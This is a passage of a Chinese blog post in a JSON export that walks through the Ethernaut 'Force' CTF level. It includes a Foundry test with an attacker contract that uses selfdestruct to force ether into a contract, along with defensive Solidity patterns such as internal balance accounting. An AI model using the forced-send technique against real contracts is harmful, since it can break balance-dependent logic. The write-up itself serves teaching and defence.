否 | 强制发送，无法拒绝 |\n| **预计算地址** | ❌ 否 | 发送到未来地址 |\n| **矿工奖励** | ❌ 否 | Coinbase 奖励 |\n\n### 安全编程最佳实践\n\n```solidity\n// ❌ 不安全的模式\ncontract BadPattern {\n    function criticalFunction() public {\n        require(address(this).balance == 0, \"Must be empty\");\n        // 逻辑...\n    }\n}\n\n// ✅ 安全的模式  \ncontract GoodPattern {\n    uint256 private expectedBalance;\n    \n    function criticalFunction() public {\n        require(expectedBalance == 0, \"Expected balance must be zero\");\n        // 逻辑...\n    }\n    \n    function updateExpectedBalance(uint256 amount) private {\n        expectedBalance = amount;\n    }\n}\n```\n\n## 🎯 总结\n\nForce 关卡教导了重要的以太币处理原则：\n\n- ✅ **永远不要依赖 `address(this).balance`** - 可以被强制修改\n- ✅ **使用内部状态跟踪余额** - 更加安全可靠\n- ✅ **理解 selfdestruct 的强制性** - 无法被合约拒绝\n- ✅ **设计时考虑意外资金** - 处理非预期的以太币\n\n这个看似简单的攻击揭示了以太坊虚拟机层面的重要特性。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**\n- **[下一关: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","slug":"ethernaut-level-07-force","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp8000tbf5q18483v61","content":"<h1 id=\"🎯-Ethernaut-Level-7-Force-强制发送以太币攻击\"><a href=\"#🎯-Ethernaut-Level-7-Force-强制发送以太币攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 7: Force - 强制发送以太币攻击\"></a>🎯 Ethernaut Level 7: Force - 强制发送以太币攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/7\">Ethernaut Level 7 - Force</a><br><strong>攻击类型</strong>: 强制转账、selfdestruct 利用<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><ol>\n<li><strong>向合约发送以太币</strong> - 让 <code>Force</code> 合约的余额大于 0</li>\n<li><strong>绕过接收限制</strong> - 合约没有 payable 函数或 fallback</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Force &#123;/*</span><br><span class=\"line\">                   MEOW ?</span><br><span class=\"line\">         /\\_/\\   /</span><br><span class=\"line\">    ____/ o o \\</span><br><span class=\"line\">  /~____  =ø= /</span><br><span class=\"line\"> (______)__m_m)</span><br><span class=\"line\">*/&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>关键问题</strong>：</p>\n<ul>\n<li>合约完全空白，没有任何函数</li>\n<li>没有 <code>payable</code> 函数或 <code>fallback/receive</code> 函数</li>\n<li>正常情况下无法接收以太币</li>\n</ul>\n<h3 id=\"强制发送以太币的方法\"><a href=\"#强制发送以太币的方法\" class=\"headerlink\" title=\"强制发送以太币的方法\"></a>强制发送以太币的方法</h3><p>尽管合约拒绝接收以太币，但有几种方法可以强制发送：</p>\n<ol>\n<li><strong>selfdestruct()</strong> - 合约自毁时强制转移余额 ⭐</li>\n<li><strong>预计算地址挖矿</strong> - 向未来地址预先发送以太币</li>\n<li><strong>Coinbase 奖励</strong> - 作为矿工奖励接收地址</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 目标合约 - 完全空白</span><br><span class=\"line\">contract Force &#123;</span><br><span class=\"line\">    // 空合约，无法正常接收以太币</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ForceAttacker &#123;</span><br><span class=\"line\">    constructor() payable &#123;</span><br><span class=\"line\">        // 构造函数接收以太币</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack(address payable target) public &#123;</span><br><span class=\"line\">        // 🎯 关键攻击：使用 selfdestruct 强制发送以太币</span><br><span class=\"line\">        selfdestruct(target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ForceTest is Test &#123;</span><br><span class=\"line\">    Force public force;</span><br><span class=\"line\">    ForceAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user = makeAddr(&quot;user&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署 Force 合约</span><br><span class=\"line\">        force = new Force();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给用户一些以太币</span><br><span class=\"line\">        vm.deal(user, 10 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testForceExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;=== 攻击前状态 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Force 合约余额:&quot;, address(force).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约并发送以太币</span><br><span class=\"line\">        attacker = new ForceAttacker&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;攻击合约余额:&quot;, address(attacker).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 🎯 执行攻击：自毁并强制发送以太币</span><br><span class=\"line\">        attacker.attack(payable(address(force)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== 攻击后状态 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Force 合约余额:&quot;, address(force).balance);</span><br><span class=\"line\">        console.log(&quot;攻击合约余额:&quot;, address(attacker).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertGt(address(force).balance, 0);</span><br><span class=\"line\">        console.log(&quot;攻击成功！Force 合约现在有以太币了&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testNormalTransferFails() public &#123;</span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 尝试正常发送以太币 - 应该失败</span><br><span class=\"line\">        (bool success,) = address(force).call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;正常转账失败，如预期&quot;);</span><br><span class=\"line\">        assertEq(address(force).balance, 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPreComputedAddress() public &#123;</span><br><span class=\"line\">        // 演示预计算地址方法</span><br><span class=\"line\">        address futureAddress = computeCreateAddress(user, vm.getNonce(user) + 1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 向未来地址发送以太币</span><br><span class=\"line\">        (bool success,) = futureAddress.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success); // 地址不存在，发送失败</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;预计算地址:&quot;, futureAddress);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他强制发送方法\"><a href=\"#其他强制发送方法\" class=\"headerlink\" title=\"其他强制发送方法\"></a>其他强制发送方法</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract AlternativeAttacks &#123;</span><br><span class=\"line\">    // 方法 2: 预计算地址 (实际中很难实现)</span><br><span class=\"line\">    function preComputedAttack() public payable &#123;</span><br><span class=\"line\">        // 1. 计算目标合约的未来部署地址</span><br><span class=\"line\">        // 2. 向该地址发送以太币</span><br><span class=\"line\">        // 3. 在该地址部署目标合约</span><br><span class=\"line\">        // 注意：这需要控制部署时机，实际中很困难</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 方法 3: 作为矿工设置 coinbase (仅理论上可能)</span><br><span class=\"line\">    function coinbaseAttack() public &#123;</span><br><span class=\"line\">        // 如果你是矿工，可以将目标地址设为 coinbase</span><br><span class=\"line\">        // 挖矿奖励会直接发送到该地址</span><br><span class=\"line\">        // 但这需要巨大的算力投入</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-避免依赖合约余额进行逻辑判断\"><a href=\"#1-避免依赖合约余额进行逻辑判断\" class=\"headerlink\" title=\"1. 避免依赖合约余额进行逻辑判断\"></a>1. 避免依赖合约余额进行逻辑判断</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract VulnerableContract &#123;</span><br><span class=\"line\">    // ❌ 危险：依赖合约余额</span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        require(address(this).balance == 0, &quot;Contract must be empty&quot;);</span><br><span class=\"line\">        // 可被 selfdestruct 攻击绕过</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeContract &#123;</span><br><span class=\"line\">    uint256 private internalBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ✅ 安全：使用内部记账</span><br><span class=\"line\">    function deposit() public payable &#123;</span><br><span class=\"line\">        internalBalance += msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        require(internalBalance == 0, &quot;Internal balance must be zero&quot;);</span><br><span class=\"line\">        // 无法被外部强制修改</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用内部状态变量\"><a href=\"#2-使用内部状态变量\" class=\"headerlink\" title=\"2. 使用内部状态变量\"></a>2. 使用内部状态变量</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureForce &#123;</span><br><span class=\"line\">    uint256 private receivedAmount;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        receivedAmount += msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getReceivedAmount() public view returns (uint256) &#123;</span><br><span class=\"line\">        return receivedAmount; // 只计算主动接收的以太币</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getTotalBalance() public view returns (uint256) &#123;</span><br><span class=\"line\">        return address(this).balance; // 包括强制发送的以太币</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-检查余额变化\"><a href=\"#3-检查余额变化\" class=\"headerlink\" title=\"3. 检查余额变化\"></a>3. 检查余额变化</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract BalanceMonitor &#123;</span><br><span class=\"line\">    uint256 private lastKnownBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier balanceCheck() &#123;</span><br><span class=\"line\">        uint256 balanceBefore = address(this).balance;</span><br><span class=\"line\">        _;</span><br><span class=\"line\">        uint256 balanceAfter = address(this).balance;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 检测意外的余额变化</span><br><span class=\"line\">        if (balanceAfter != lastKnownBalance) &#123;</span><br><span class=\"line\">            emit UnexpectedBalanceChange(lastKnownBalance, balanceAfter);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        lastKnownBalance = balanceAfter;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event UnexpectedBalanceChange(uint256 expected, uint256 actual);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"selfdestruct-机制\"><a href=\"#selfdestruct-机制\" class=\"headerlink\" title=\"selfdestruct 机制\"></a>selfdestruct 机制</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SelfDestructExample &#123;</span><br><span class=\"line\">    constructor() payable &#123;&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function destroy(address payable recipient) public &#123;</span><br><span class=\"line\">        // selfdestruct 会：</span><br><span class=\"line\">        // 1. 销毁合约代码</span><br><span class=\"line\">        // 2. 将所有以太币发送给 recipient</span><br><span class=\"line\">        // 3. 强制发送，无法被阻止</span><br><span class=\"line\">        selfdestruct(recipient);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"合约接收以太币的方式\"><a href=\"#合约接收以太币的方式\" class=\"headerlink\" title=\"合约接收以太币的方式\"></a>合约接收以太币的方式</h3><table>\n<thead>\n<tr>\n<th>方式</th>\n<th>可被阻止</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>正常转账</strong></td>\n<td>✅ 是</td>\n<td>需要 payable 函数</td>\n</tr>\n<tr>\n<td><strong>selfdestruct</strong></td>\n<td>❌ 否</td>\n<td>强制发送，无法拒绝</td>\n</tr>\n<tr>\n<td><strong>预计算地址</strong></td>\n<td>❌ 否</td>\n<td>发送到未来地址</td>\n</tr>\n<tr>\n<td><strong>矿工奖励</strong></td>\n<td>❌ 否</td>\n<td>Coinbase 奖励</td>\n</tr>\n</tbody></table>\n<h3 id=\"安全编程最佳实践\"><a href=\"#安全编程最佳实践\" class=\"headerlink\" title=\"安全编程最佳实践\"></a>安全编程最佳实践</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全的模式</span><br><span class=\"line\">contract BadPattern &#123;</span><br><span class=\"line\">    function criticalFunction() public &#123;</span><br><span class=\"line\">        require(address(this).balance == 0, &quot;Must be empty&quot;);</span><br><span class=\"line\">        // 逻辑...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全的模式  </span><br><span class=\"line\">contract GoodPattern &#123;</span><br><span class=\"line\">    uint256 private expectedBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function criticalFunction() public &#123;</span><br><span class=\"line\">        require(expectedBalance == 0, &quot;Expected balance must be zero&quot;);</span><br><span class=\"line\">        // 逻辑...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function updateExpectedBalance(uint256 amount) private &#123;</span><br><span class=\"line\">        expectedBalance = amount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Force 关卡教导了重要的以太币处理原则：</p>\n<ul>\n<li>✅ <strong>永远不要依赖 <code>address(this).balance</code></strong> - 可以被强制修改</li>\n<li>✅ <strong>使用内部状态跟踪余额</strong> - 更加安全可靠</li>\n<li>✅ <strong>理解 selfdestruct 的强制性</strong> - 无法被合约拒绝</li>\n<li>✅ <strong>设计时考虑意外资金</strong> - 处理非预期的以太币</li>\n</ul>\n<p>这个看似简单的攻击揭示了以太坊虚拟机层面的重要特性。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">上一关: Level 6 - Delegation</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">下一关: Level 8 - Vault</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-7-Force-强制发送以太币攻击\"><a href=\"#🎯-Ethernaut-Level-7-Force-强制发送以太币攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 7: Force - 强制发送以太币攻击\"></a>🎯 Ethernaut Level 7: Force - 强制发送以太币攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/7\">Ethernaut Level 7 - Force</a><br><strong>攻击类型</strong>: 强制转账、selfdestruct 利用<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><ol>\n<li><strong>向合约发送以太币</strong> - 让 <code>Force</code> 合约的余额大于 0</li>\n<li><strong>绕过接收限制</strong> - 合约没有 payable 函数或 fallback</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Force &#123;/*</span><br><span class=\"line\">                   MEOW ?</span><br><span class=\"line\">         /\\_/\\   /</span><br><span class=\"line\">    ____/ o o \\</span><br><span class=\"line\">  /~____  =ø= /</span><br><span class=\"line\"> (______)__m_m)</span><br><span class=\"line\">*/&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>关键问题</strong>：</p>\n<ul>\n<li>合约完全空白，没有任何函数</li>\n<li>没有 <code>payable</code> 函数或 <code>fallback/receive</code> 函数</li>\n<li>正常情况下无法接收以太币</li>\n</ul>\n<h3 id=\"强制发送以太币的方法\"><a href=\"#强制发送以太币的方法\" class=\"headerlink\" title=\"强制发送以太币的方法\"></a>强制发送以太币的方法</h3><p>尽管合约拒绝接收以太币，但有几种方法可以强制发送：</p>\n<ol>\n<li><strong>selfdestruct()</strong> - 合约自毁时强制转移余额 ⭐</li>\n<li><strong>预计算地址挖矿</strong> - 向未来地址预先发送以太币</li>\n<li><strong>Coinbase 奖励</strong> - 作为矿工奖励接收地址</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 目标合约 - 完全空白</span><br><span class=\"line\">contract Force &#123;</span><br><span class=\"line\">    // 空合约，无法正常接收以太币</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ForceAttacker &#123;</span><br><span class=\"line\">    constructor() payable &#123;</span><br><span class=\"line\">        // 构造函数接收以太币</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function 